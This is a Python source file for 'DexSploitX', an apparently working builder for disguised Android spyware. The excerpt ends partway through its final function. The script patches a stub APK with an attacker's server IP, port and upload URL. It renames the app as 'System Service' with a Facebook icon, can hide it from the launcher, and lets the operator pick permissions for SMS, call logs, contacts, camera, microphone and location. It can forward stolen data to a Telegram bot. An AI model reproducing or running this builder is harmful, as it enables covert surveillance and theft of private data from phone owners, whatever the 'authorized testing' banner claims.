#!/usr/bin/env python3
"""
DexSploitX Ultimate APK Builder
Uses apktool to modify decompiled APK, rebuild, and sign
"""

import os
import sys
import subprocess
import shutil
import re
import tempfile
import json
import platform
import urllib.request
from pathlib import Path
from datetime import datetime

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

def detect_environment():
    """Detect if running on Termux or Linux"""
    if os.path.exists('/data/data/com.termux'):
        return 'termux'
    elif platform.system() == 'Linux':
        return 'linux'
    elif platform.system() == 'Windows':
        return 'windows'
    else:
        return 'unknown'

def auto_setup():
    """Automatically setup dependencies for Termux/Linux"""
    env = detect_environment()
    
    print(f"\033[96m[*] Detected environment: {env.upper()}\033[0m")
    
    if env == 'termux':
        print(f"\033[93m[*] Setting up Termux environment...\033[0m")
        
        # Check and install required packages
        packages = ['openjdk-17', 'wget', 'aapt']
        for pkg in packages:
            try:
                result = subprocess.run(['pkg', 'list-installed', pkg], 
                                      capture_output=True, text=True)
                if pkg not in result.stdout:
                    print(f"\033[93m[*] Installing {pkg}...\033[0m")
                    subprocess.run(['pkg', 'install', '-y', pkg], check=True)
                    print(f"\033[92m[✓] {pkg} installed\033[0m")
            except:
                print(f"\033[91m[✗] Failed to install {pkg}\033[0m")
        
        # Install Pillow if not available
        if not PIL_AVAILABLE:
            try:
                print(f"\033[93m[*] Installing Pillow...\033[0m")
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pillow'], check=True)
                print(f"\033[92m[✓] Pillow installed\033[0m")
            except:
                print(f"\033[91m[✗] Failed to install Pillow\033[0m")
        
        # Download compatible apktool for Termux (older version without aapt2)
        apktool_path = Path(__file__).parent / "apktool.jar"
        if not apktool_path.exists():
            print(f"\033[93m[*] Downloading Termux-compatible apktool...\033[0m")
            try:
                # Use v2.6.1 - more stable on Termux
                url = "https://github.com/iBotPeaches/Apktool/releases/download/v2.6.1/apktool_2.6.1.jar"
                urllib.request.urlretrieve(url, str(apktool_path))
                print(f"\033[92m[✓] apktool v2.6.1 downloaded (Termux-optimized)\033[0m")
            except Exception as e:
                print(f"\033[91m[✗] Failed to download apktool: {e}\033[0m")
                print(f"\033[93m[!] Manual download: wget {url} -O apktool.jar\033[0m")
        
        # Set environment variable to use aapt instead of aapt2
        os.environ['APKTOOL_USE_AAPT2'] = '0'
        print(f"\033[92m[✓] Configured to use aapt (not aapt2) for Termux compatibility\033[0m")
    
    elif env == 'linux':
        print(f"\033[93m[*] Setting up Linux environment...\033[0m")
        
        # Check Java
        try:
            subprocess.run(['java', '-version'], capture_output=True, check=True)
            print(f"\033[92m[✓] Java found\033[0m")
        except:
            print(f"\033[91m[✗] Java not found\033[0m")
            print(f"\033[93m[!] Install: sudo apt install openjdk-17-jdk\033[0m")
        
        # Install Pillow if not available
        if not PIL_AVAILABLE:
            try:
                print(f"\033[93m[*] Installing Pillow...\033[0m")
                subprocess.run([sys.executable, '-m', 'pip', 'install', 'pillow'], check=True)
                print(f"\033[92m[✓] Pillow installed\033[0m")
            except:
                print(f"\033[91m[✗] Failed to install Pillow\033[0m")
        
        # Download apktool if missing
        apktool_path = Path(__file__).parent / "apktool.jar"
        if not apktool_path.exists():
            print(f"\033[93m[*] Downloading apktool...\033[0m")
            try:
                url = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
                urllib.request.urlretrieve(url, str(apktool_path))
                print(f"\033[92m[✓] apktool downloaded\033[0m")
            except Exception as e:
                print(f"\033[91m[✗] Failed to download apktool: {e}\033[0m")
    
    print(f"\033[92m[✓] Setup complete!\033[0m\n")

class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class DexSploitXBuilder:
    def __init__(self):
        self.banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════╗
║        {Colors.RED}██████╗ ███████╗██╗  ██╗███████╗██████╗ {Colors.CYAN}        ║
║        {Colors.RED}██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██╔══██╗{Colors.CYAN}        ║
║        {Colors.RED}██║  ██║█████╗   ╚███╔╝ ███████╗██████╔╝{Colors.CYAN}        ║
║        {Colors.RED}██║  ██║██╔══╝   ██╔██╗ ╚════██║██╔═══╝ {Colors.CYAN}        ║
║        {Colors.RED}██████╔╝███████╗██╔╝ ██╗███████║██║     {Colors.CYAN}        ║
║        {Colors.RED}╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     {Colors.CYAN}        ║
║                                                           ║
║          {Colors.YELLOW}Ultimate APK Builder v4.0{Colors.CYAN}                   ║
║          {Colors.GREEN}Supports Android 5.0 - 16 (API 21-36){Colors.CYAN}       ║
║                                                           ║
║          {Colors.BOLD}Developed by: {Colors.YELLOW}NIGHTKING{Colors.CYAN}                    ║
║          {Colors.BOLD}GitHub: {Colors.YELLOW}https://github.com/offsecnight{Colors.CYAN}    ║
╚═══════════════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}[!] FOR AUTHORIZED SECURITY TESTING ONLY{Colors.END}
"""
        
        self.base_dir = Path(__file__).parent
        self.stub_dir = self.base_dir / "stub"  # Original stub (never modified)
        self.work_dir = None  # Temporary working directory
        self.apktool_jar = self.base_dir / "apktool.jar"
        self.keystore_path = self.base_dir.parent / "keystore" / "keystore"
        self.output_dir = self.base_dir.parent / "APK"
        self.config_json_path = self.base_dir.parent / "config.json"
        self.config = {}
        
    def print_banner(self):
        print(self.banner)
    
    def check_requirements(self):
        """Check required tools"""
        print(f"{Colors.CYAN}[*] Checking requirements...{Colors.END}")
        
        # Check Java
        try:
            subprocess.run(['java', '-version'], capture_output=True, check=True)
            print(f"{Colors.GREEN}[✓] Java found{Colors.END}")
        except:
            print(f"{Colors.RED}[✗] Java not found{Colors.END}")
            return False
        
        # Check PIL/Pillow
        if PIL_AVAILABLE:
            print(f"{Colors.GREEN}[✓] Pillow found{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] Pillow not found - icon change disabled{Colors.END}")
            print(f"{Colors.YELLOW}[!] Install: pip install Pillow{Colors.END}")
        
        # Check apktool
        if not self.apktool_jar.exists():
            print(f"{Colors.RED}[✗] apktool.jar not found{Colors.END}")
            return False
        print(f"{Colors.GREEN}[✓] apktool.jar found{Colors.END}")
        
        # Check stub
        if not self.stub_dir.exists():
            print(f"{Colors.RED}[✗] stub folder not found{Colors.END}")
            return False
        print(f"{Colors.GREEN}[✓] Stub APK found{Colors.END}")
        
        # Check keystore
        if not self.keystore_path.exists():
            print(f"{Colors.YELLOW}[!] Keystore not found, will create{Colors.END}")
        else:
            print(f"{Colors.GREEN}[✓] Keystore found{Colors.END}")
        
        print()
        return True
    
    def create_working_directory(self):
        """Create temporary working directory and copy stub"""
        print(f"{Colors.CYAN}[*] Preparing build environment...{Colors.END}", end='', flush=True)
        
        try:
            # Create temp directory
            temp_base = self.base_dir / "temp"
            temp_base.mkdir(exist_ok=True)
            
            # Create unique work directory
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.work_dir = temp_base / f"build_{timestamp}"
            
            # Copy stub to work directory
            shutil.copytree(self.stub_dir, self.work_dir)
            
            print(f"\r{Colors.GREEN}[✓] Build environment ready{Colors.END}" + " " * 30)
            return True
            
        except Exception as e:
            print(f"\r{Colors.RED}[✗] Failed to create working directory: {e}{Colors.END}")
            return False
    
    def cleanup_working_directory(self):
        """Delete temporary working directory"""
        if self.work_dir and self.work_dir.exists():
            try:
                shutil.rmtree(self.work_dir)
            except Exception as e:
                pass
    
    def get_config(self):
        """Get build configuration"""
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}                  CONFIGURATION                            {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
        
        # Server IP
        self.config['ip'] = input(f"{Colors.YELLOW}[?] Server IP: {Colors.END}").strip()
        
        # Server Port
        self.config['port'] = input(f"{Colors.YELLOW}[?] Server Port (default: 8080): {Colors.END}").strip() or "8080"
        
        # App Name
        self.config['app_name'] = input(f"{Colors.YELLOW}[?] App Name (default: System Service): {Colors.END}").strip() or "System Service"
        
        # Package Name
        self.config['package'] = input(f"{Colors.YELLOW}[?] Package (default: com.system.service): {Colors.END}").strip() or "com.system.service"
        
        # Website
        self.config['website'] = input(f"{Colors.YELLOW}[?] Website URL (default: https://www.android.com): {Colors.END}").strip() or "https://www.android.com"
        
        # Icon
        default_icon = self.base_dir / "facebook.png"
        icon_prompt = f"{Colors.YELLOW}[?] Icon path (default: facebook.png): {Colors.END}"
        icon_path = input(icon_prompt).strip()
        
        if not icon_path:
            icon_path = str(default_icon)
        
        icon_file = Path(icon_path)
        if icon_file.exists():
            self.config['icon'] = icon_file
            print(f"{Colors.GREEN}[✓] Icon will be changed: {icon_file.name}{Colors.END}")
        else:
            self.config['icon'] = None
            print(f"{Colors.YELLOW}[!] Icon not found, using default{Colors.END}")
        
        # Telegram Configuration
        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}           TELEGRAM AUTO-DUMP CONFIGURATION                {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
        
        print(f"{Colors.YELLOW}Configure Telegram to auto-dump data from both APK and Server{Colors.END}")
        telegram_choice = input(f"{Colors.YELLOW}[?] Enable Telegram auto-dump? (y/n, default: n): {Colors.END}").strip().lower()
        
        if telegram_choice == 'y':
            bot_token = input(f"{Colors.YELLOW}[?] Telegram Bot Token: {Colors.END}").strip()
            chat_id = input(f"{Colors.YELLOW}[?] Telegram Chat ID: {Colors.END}").strip()
            
            if bot_token and chat_id:
                self.config['telegram_bot_token'] = bot_token
                self.config['telegram_chat_id'] = chat_id
                print(f"{Colors.GREEN}[✓] Telegram configured: {bot_token[:20]}...{Colors.END}")
                print(f"{Colors.GREEN}[✓] Chat ID: {chat_id}{Colors.END}")
                print(f"{Colors.GREEN}[✓] Data will auto-dump to Telegram from APK and Server{Colors.END}")
            else:
                self.config['telegram_bot_token'] = ""
                self.config['telegram_chat_id'] = ""
                print(f"{Colors.YELLOW}[!] Telegram not configured (skipped){Colors.END}")
        else:
            self.config['telegram_bot_token'] = ""
            self.config['telegram_chat_id'] = ""
            print(f"{Colors.YELLOW}[!] Telegram auto-dump disabled{Colors.END}")
        
        # Hide App Option
        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}              APP VISIBILITY                               {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
        
        hide_choice = input(f"{Colors.YELLOW}[?] Hide app from launcher? (y/n, default: n): {Colors.END}").strip().lower()
        self.config['hide_app'] = (hide_choice == 'y')
        
        if self.config['hide_app']:
            print(f"{Colors.GREEN}[✓] App will be hidden from launcher{Colors.END}")
        else:
            print(f"{Colors.GREEN}[✓] App will be visible in launcher{Colors.END}")
        
        # Permissions Selection
        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}              PERMISSION SELECTION                         {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
        
        print(f"{Colors.YELLOW}Select permissions to include (y/n for each):{Colors.END}\n")
        
        # Define available permissions with descriptions
        available_permissions = {
            'READ_CONTACTS': ('android.permission.READ_CONTACTS', 'Access contacts'),
            'READ_PHONE_STATE': ('android.permission.READ_PHONE_STATE', 'Read phone state'),
            'READ_CALL_LOG': ('android.permission.READ_CALL_LOG', 'Access call logs'),
            'READ_SMS': ('android.permission.READ_SMS', 'Read SMS messages'),
            'RECEIVE_SMS': ('android.permission.RECEIVE_SMS', 'Receive SMS'),
            'CAMERA': ('android.permission.CAMERA', 'Access camera'),
            'RECORD_AUDIO': ('android.permission.RECORD_AUDIO', 'Record audio'),
            'ACCESS_FINE_LOCATION': ('android.permission.ACCESS_FINE_LOCATION', 'Precise location'),
            'ACCESS_COARSE_LOCATION': ('android.permission.ACCESS_COARSE_LOCATION', 'Approximate location'),
            'ACCESS_BACKGROUND_LOCATION': ('android.permission.ACCESS_BACKGROUND_LOCATION', 'Background location'),
            'READ_EXTERNAL_STORAGE': ('android.permission.READ_EXTERNAL_STORAGE', 'Read storage'),
            'WRITE_EXTERNAL_STORAGE': ('android.permission.WRITE_EXTERNAL_STORAGE', 'Write storage'),
            'MANAGE_EXTERNAL_STORAGE': ('android.permission.MANAGE_EXTERNAL_STORAGE', 'Manage all files (opens settings)'),
        }
        
        selected_permissions = []
        
        for key, (perm, desc) in available_permissions.items():
            choice = input(f"{Colors.CYAN}  [{desc}]{Colors.END} (y/n, default: y): ").strip().lower()
            if choice != 'n':
                selected_permissions.append(perm)
        
        self.config['permissions'] = selected_permissions
        
        print(f"\n{Colors.GREEN}[✓] {len(selected_permissions)} permissions selected{Colors.END}")
        print(f"{Colors.GREEN}[✓] Configuration complete{Colors.END}\n")
        return True
    
    def modify_server_config(self):
        """Modify all smali files with IP and Port configuration"""
        print(f"{Colors.CYAN}[*] Configuring server settings...{Colors.END}", end='', flush=True)
        
        # 1. Update ServerConfig.smali
        config_file = self.work_dir / "smali/com/system/DroidX/ServerConfig.smali"
        
        if config_file.exists():
            with open(config_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content = re.sub(
                r'(\.field public static final SERVER_IP:Ljava/lang/String; = )"[^"]*"',
                rf'\1"{self.config["ip"]}"',
                content
            )
            
            content = re.sub(
                r'(\.field public static final SERVER_PORT:Ljava/lang/String; = )"[^"]*"',
                rf'\1"{self.config["port"]}"',
                content
            )
            
            content = re.sub(
                r'(const-string v\d+, )"4444"',
                rf'\1"{self.config["port"]}"',
                content
            )
            
            with open(config_file, 'w', encoding='utf-8') as f:
                f.write(content)
        
        # 2. Update ConnectionService.smali
        connection_file = self.work_dir / "smali/com/system/DroidX/ConnectionService.smali"
        
        if connection_file.exists():
            with open(connection_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content = re.sub(
                r'(const-string v\d+, )"[\d\.]+"(\s+invoke-virtual \{[^}]+\}, Ljava/lang/String;->trim)',
                rf'\1"{self.config["ip"]}"\2',
                content
            )
            
            content = re.sub(
                r'(const-string v\d+, )"4444"(\s+invoke-static \{[^}]+\}, Ljava/lang/Integer;->parseInt)',
                rf'\1"{self.config["port"]}"\2',
                content
            )
            
            with open(connection_file, 'w', encoding='utf-8') as f:
                f.write(content)
        
        # 3. Update UploadService.smali
        upload_file = self.work_dir / "smali/com/system/DroidX/utils/UploadService.smali"
        
        if upload_file.exists():
            with open(upload_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            upload_port = str(int(self.config["port"]) + 1) if self.config["port"].isdigit() else "8081"
            
            content = re.sub(
                r'(const-string v\d+, )"http://[\d\.]+:\d+/upload"',
                rf'\1"http://{self.config["ip"]}:{upload_port}/upload"',
                content
            )
            
            with open(upload_file, 'w', encoding='utf-8') as f:
                f.write(content)
        
        print(f"\r{Colors.GREEN}[✓] Server configured{Colors.END}" + " " * 30)
        return True
    
    def modify_manifest(self):
        """Modify AndroidManifest.xml"""
        print(f"{Colors.CYAN}[*] Updating manifest...{Colors.END}", end='', flush=True)
        
        manifest_file = self.work_dir / "AndroidManifest.xml"
        
        with open(manifest_file, 'r') as f:
            content = f.read()
        
        content = re.sub(
            r'android:label="[^"]*"',
            f'android:label="{self.config["app_name"]}"',
            content,
            count=1
        )
        
        content = re.sub(
            r'package="[^"]*"',
            f'package="{self.config["package"]}"',
            content
        )
        
        if self.config.get('hide_app', False):
            content = re.sub(
                r'<category android:name="android\.intent\.category\.LAUNCHER"/>',
                '<category android:name="android.intent.category.INFO"/>',
                content
            )
        
        with open(manifest_file, 'w') as f:
            f.write(content)
        
        print(f"\r{Colors.GREEN}[✓] Manifest updated{Colors.END}" + " " * 30)
        return True
    
    def modify_permissions(self):
        """Modify permissions in PermissionHelper.smali and AndroidManifest.xml"""
        # 1. Update PermissionHelper.smali
        permission_helper = self.work_dir / "smali/com/system/DroidX/utils/PermissionHelper.smali"
        
        if permission_helper.exists():
            with open(permission_helper, 'r', encoding='utf-8') as f:
                content = f.read()
            
            clinit_match = re.search(r'\.method static constructor <clinit>\(\)V.*?\.end method', content, re.DOTALL)
            
            if clinit_match:
                original_clinit = clinit_match.group(0)
                original_perms = re.findall(r'const-string v\d+, "(android\.permission\.[^"]+)"', original_clinit)
                filtered_perms = [p for p in original_perms if p in self.config['permissions']]
                
                if not filtered_perms:
                    filtered_perms = self.config['permissions']
                
                num_perms = len(filtered_perms)
                
                new_clinit = "    .method static constructor <clinit>()V\n"
                new_clinit += "    .locals 3\n\n"
                new_clinit += f"    const/16 v0, 0x{num_perms:x}\n\n"
                new_clinit += "    .line 22\n"
                new_clinit += "    new-array v0, v0, [Ljava/lang/String;\n\n"
                
                for idx, perm in enumerate(filtered_perms):
                    if idx <= 7:
                        new_clinit += f"    const/4 v1, 0x{idx:x}\n\n"
                    else:
                        new_clinit += f"    const/16 v1, 0x{idx:x}\n\n"
                    
                    new_clinit += f"    const-string v2, \"{perm}\"\n\n"
                    new_clinit += "    aput-object v2, v0, v1\n\n"
                
                new_clinit += "    sput-object v0, Lcom/system/DroidX/utils/PermissionHelper;->REQUIRED_PERMISSIONS:[Ljava/lang/String;\n\n"
                new_clinit += "    return-void\n"
                new_clinit += ".end method"
                
                content = re.sub(
                    r'\.method static constructor <clinit>\(\)V.*?\.end method',
                    new_clinit,
                    content,
                    flags=re.DOTALL
                )
                
                with open(permission_helper, 'w', encoding='utf-8') as f:
                    f.write(content)
        
        # 2. Update AndroidManifest.xml
        manifest_file = self.work_dir / "AndroidManifest.xml"
        
        if manifest_file.exists():
            with open(manifest_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            new_lines = []
            
            core_permissions = [
                'android.permission.INTERNET',
                'android.permission.ACCESS_NETWORK_STATE',
                'android.permission.ACCESS_WIFI_STATE',
                'android.permission.POST_NOTIFICATIONS',
                'android.permission.FOREGROUND_SERVICE',
                'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
                'android.permission.FOREGROUND_SERVICE_CAMERA',
                'android.permission.FOREGROUND_SERVICE_SPECIAL_USE',
                'android.permission.FOREGROUND_SERVICE_MICROPHONE',
                'android.permission.WAKE_LOCK',
                'android.permission.VIBRATE',
                'android.permission.RECEIVE_BOOT_COMPLETED',
                'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
            ]
            
            for line in lines:
                if '<uses-permission' in line:
                    match = re.search(r'android:name="([^"]+)"', line)
                    if match:
                        perm_name = match.group(1)
                        if perm_name in core_permissions or perm_name in self.config['permissions']:
                            new_lines.append(line)
                    else:
                        new_lines.append(line)
                
                elif '<uses-feature' in line or '<permission ' in line:
                    if 'android.hardware.camera' in line:
                        if 'android.permission.CAMERA' in self.config['permissions']:
                            new_lines.append(line)
                    elif 'android.hardware.telephony' in line:
                        if any(p in self.config['permissions'] for p in ['android.permission.READ_PHONE_STATE', 'android.permission.READ_CALL_LOG', 'android.permission.READ_SMS']):
                            new_lines.append(line)
                    else:
                        new_lines.append(line)
                
                else:
                    new_lines.append(line)
            
            with open(manifest_file, 'w', encoding='utf-8') as f:
                f.writelines(new_lines)
        
        return True
    
    def modify_strings(self):
        """Modify strings.xml"""
        strings_file = self.work_dir / "res/values/strings.xml"
        
        if strings_file.exists():
            with open(strings_file, 'r') as f:
                content = f.read()
            
            content = re.sub(
                r'<string name="app_name">[^<]*</string>',
                f'<string name="app_name">{self.config["app_name"]}</string>',
                content
            )
            
            with open(strings_file, 'w') as f:
                f.write(content)
        
        return True
    
    def clean_icon_conflicts(self):
        """Remove all .webp icon files and adaptive icon XML to avoid conflicts"""
        try:
            densities = ['mdpi', 'hdpi', 'xhdpi', 'xxhdpi', 'xxxhdpi']
            
            for density in densities:
                mipmap_dir = self.work_dir / f"res/mipmap-{density}"
                if mipmap_dir.exists():
                    for webp_file in mipmap_dir.glob("*.webp"):
                        webp_file.unlink()
            
            anydpi_dir = self.work_dir / "res/mipmap-anydpi-v26"
            if anydpi_dir.exists():
                for xml_file in anydpi_dir.glob("*.xml"):
                    xml_file.unlink()
            
            return True
            
        except Exception as e:
            return False
    
    def change_icon(self):
        """Change app icon"""
        if not self.config.get('icon'):
            return True
        
        if not PIL_AVAILABLE:
            return True
        
        try:
            icon_sizes = {
                'mdpi': 48,
                'hdpi': 72,
                'xhdpi': 96,
                'xxhdpi': 144,
                'xxxhdpi': 192
            }
            
            original_icon = Image.open(self.config['icon'])
            
            if original_icon.mode != 'RGBA':
                original_icon = original_icon.convert('RGBA')
            
            for density, size in icon_sizes.items():
                mipmap_dir = self.work_dir / f"res/mipmap-{density}"
                
                if mipmap_dir.exists():
                    for icon_file in mipmap_dir.glob("ic_launcher*.png"):
                        icon_file.unlink()
                    
                    resized_icon = original_icon.resize((size, size), Image.Resampling.LANCZOS)
                    
                    icon_file = mipmap_dir / "ic_launcher.png"
                    resized_icon.save(icon_file, 'PNG')
                    
                    round_icon_file = mipmap_dir / "ic_launcher_round.png"
                    resized_icon.save(round_icon_file, 'PNG')
            
            return True
            
        except Exception as e:
            return True
    
    def modify_mainactivity(self):
        """Modify MainActivity.smali to update website"""
        mainactivity_file = self.work_dir / "smali/com/system/DroidX/MainActivity.smali"
        
        if mainactivity_file.exists():
            with open(mainactivity_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content = re.sub(
                r'(\.field private static final OFFICIAL_WEBSITE:Ljava/lang/String; = )"[^"]*"',
                rf'\1"{self.config["website"]}"',
                content
            )
            
            content = re.sub(
                r'(const-string v\d+, )"[^"]*"(\s+invoke-virtual \{[^}]+\}, Landroid/webkit/WebView;->loadUrl)',
                rf'\1"{self.config["website"]}"\2',
                content
            )
            
            with open(mainactivity_file, 'w', encoding='utf-8') as f:
                f.write(content)
        
        return True
    
    def update_config_json(self):
        """Update config.json with Telegram credentials"""
        if not self.config.get('telegram_bot_token'):
            return True
        
        print(f"{Colors.CYAN}[*] Updating config.json...{Colors.END}", end='', flush=True)
        
        try:
            config_data = {
                "telegram_bot_token": self.config.get('telegram_bot_token', ''),
                "telegram_chat_id": self.config.get('telegram_chat_id', '')
            }
            
            # Create config.json in parent directory (same level as DexSploitX.py)
            with open(self.config_json_path, 'w', encoding='utf-8') as f:
                json.dump(config_data, f, indent=4)
            
            print(f"\r{Colors.GREEN}[✓] config.json updated{Colors.END}" + " " * 30)
            return True
            
        except Exception as e:
            print(f"\r{Colors.YELLOW}[!] Failed to update config.json: {e}{Colors.END}")
            return True  # Don't fail the build
    
    def rebuild_apk(self):
        """Rebuild APK using apktool"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}                  BUILDING APK                             {Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
        
        output_apk = self.base_dir / "output.apk"
        
        # Remove old output
        if output_apk.exists():
            output_apk.unlink()
        
        cmd = [
            'java', '-jar', str(self.apktool_jar),
            'b', str(self.work_dir),
            '-o', str(output_apk)
        ]
        
        # Add --use-aapt flag for Termux compatibility
        if detect_environment() == 'termux':
            cmd.insert(3, '--use-aapt')
        
        print(f"{Colors.YELLOW}[*] Building APK...{Colors.END}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}[✓] APK built successfully{Colors.END}")
                return output_apk
            else:
                print(f"{Colors.RED}[✗] Build failed:{Colors.END}")
                print(result.stderr)
                return None
        except Exception as e:
            print(f"{Colors.RED}[✗] Build error: {e}{Colors.END}")
            return None
    
    def sign_apk(self, unsigned_apk):
        """Sign APK with keystore using apksigner"""
        print(f"\n{Colors.CYAN}[*] Signing APK...{Colors.END}")
        
        # Keystore credentials
        KEYSTORE_PASSWORD = '12345678'
        KEY_ALIAS = 'key0'
        KEY_PASSWORD = '12345678'
        
        # Create keystore if doesn't exist
        if not self.keystore_path.exists():
            print(f"{Colors.YELLOW}[*] Creating keystore...{Colors.END}")
            self.keystore_path.parent.mkdir(parents=True, exist_ok=True)
            
            cmd = [
                'keytool', '-genkey', '-v',
                '-keystore', str(self.keystore_path),
                '-alias', KEY_ALIAS,
                '-keyalg', 'RSA',
                '-keysize', '2048',
                '-validity', '10000',
                '-storepass', KEYSTORE_PASSWORD,
                '-keypass', KEY_PASSWORD,
                '-dname', 'CN=System, OU=IT, O=System, L=City, S=State, C=US'
            ]
            
            subprocess.run(cmd, capture_output=True)
            print(f"{Colors.GREEN}[✓] Keystore created{Colors.END}")
        
        # Output signed APK
        signed_apk = self.base_dir / "signed.apk"
        if signed_apk.exists():
            signed_apk.unlink()
        
        # Try apksigner first (modern Android tool)
        try:
            # Check if apksigner is available
            apksigner_cmd = self.find_apksigner()
            
            if apksigner_cmd:
                print(f"{Colors.CYAN}[*] Using apksigner...{Colors.END}")
                cmd = [
                    apksigner_cmd, 'sign',
                    '--ks', str(self.keystore_path),
                    '--ks-key-alias', KEY_ALIAS,
                    '--ks-pass', f'pass:{KEYSTORE_PASSWORD}',
                    '--key-pass', f'pass:{KEY_PASSWORD}',
                    '--out', str(signed_apk),
                    str(unsigned_apk)
                ]
                
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    print(f"{Colors.GREEN}[✓] APK signed with apksigner{Colors.END}")
                    return signed_apk
                else:
                    print(f"{Colors.YELLOW}[!] apksigner failed, trying jarsigner...{Colors.END}")
                    raise Exception("apksigner failed")
            else:
                raise Exception("apksigner not found")
                
        except Exception as e:
            # Fallback to jarsigner
            print(f"{Colors.CYAN}[*] Using jarsigner...{Colors.END}")
            
            cmd = [
                'jarsigner',
                '-verbose',
                '-sigalg', 'SHA256withRSA',
                '-digestalg', 'SHA-256',
                '-keystore', str(self.keystore_path),
                '-storepass', KEYSTORE_PASSWORD,
                '-keypass', KEY_PASSWORD,
                str(unsigned_apk),
                KEY_ALIAS
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Move to signed.apk
                shutil.move(str(unsigned_apk), str(signed_apk))
                
                # Align APK with zipalign
                self.align_apk(signed_apk)
                
                print(f"{Colors.GREEN}[✓] APK signed with jarsigner{Colors.END}")
                return signed_apk
            else:
                print(f"{Colors.RED}[✗] Signing failed:{Colors.END}")
                print(result.stderr)
                return None
    
    def find_apksigner(self):
        """Find apksigner in Android SDK"""
        # Common locations
        possible_paths = [
            Path.home() / "AppData/Local/Android/Sdk/build-tools",
            Path("C:/Android/Sdk/build-tools"),
            Path("C:/Program Files/Android/Sdk/build-tools"),
            Path("C:/Program Files (x86)/Android/Sdk/build-tools"),
        ]
        
        for sdk_path in possible_paths:
            if sdk_path.exists():
                # Find latest build-tools version
                versions = sorted([d for d in sdk_path.iterdir() if d.is_dir()], reverse=True)
                for version_dir in versions:
                    apksigner = version_dir / "apksigner.bat"
                    if apksigner.exists():
                        return str(apksigner)
        
        # Try system PATH
        try:
            result = subprocess.run(['apksigner', '--version'], capture_output=True)
            if result.returncode == 0:
                return 'apksigner'
        except:
            pass
        
        return None
    
    def align_apk(self, apk_path):
        """Align APK with zipalign"""
        try:
            # Find zipalign
            zipalign = self.find_zipalign()
            if not zipalign:
                print(f"{Colors.YELLOW}[!] zipalign not found, skipping alignment{Colors.END}")
                return
            
            aligned_apk = self.base_dir / "aligned.apk"
            
            cmd = [zipalign, '-f', '-v', '4', str(apk_path), str(aligned_apk)]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                shutil.move(str(aligned_apk), str(apk_path))
                print(f"{Colors.GREEN}[✓] APK aligned{Colors.END}")
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Alignment failed: {e}{Colors.END}")
    
    def find_zipalign(self):
        """Find zipalign in Android SDK"""
        possible_paths = [
            Path.home() / "AppData/Local/Android/Sdk/build-tools",
            Path("C:/Android/Sdk/build-tools"),
            Path("C:/Program Files/Android/Sdk/build-tools"),
            Path("C:/Program Files (x86)/Android/Sdk/build-tools"),
        ]
        
        for sdk_path in possible_paths:
            if sdk_path.exists():
                versions = sorted([d for d in sdk_path.iterdir() if d.is_dir()], reverse=True)
                for version_dir in versions:
                    zipalign = version_dir / "zipalign.exe"
                    if zipalign.exists():
                        return str(zipalign)
        
        try:
            result = subprocess.run(['zipalign', '-h'], capture_output=True)
            if result.returncode == 0 or result.returncode == 1:
                return 'zipalign'
        except:
            pass
        
        return None
    
    def copy_to_output(self, signed_apk):
        """Copy final APK to output folder"""
        print(f"\n{Colors.CYAN}[*] Copying to output folder...{Colors.END}")
        
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"DexSploitX_{self.config['app_name'].replace(' ', '_')}_{timestamp}.apk"
        final_apk = self.output_dir / filename
        
        shutil.copy2(signed_apk, final_apk)
        
        size_mb = final_apk.stat().st_size / (1024 * 1024)
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}                  BUILD COMPLETE                           {Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
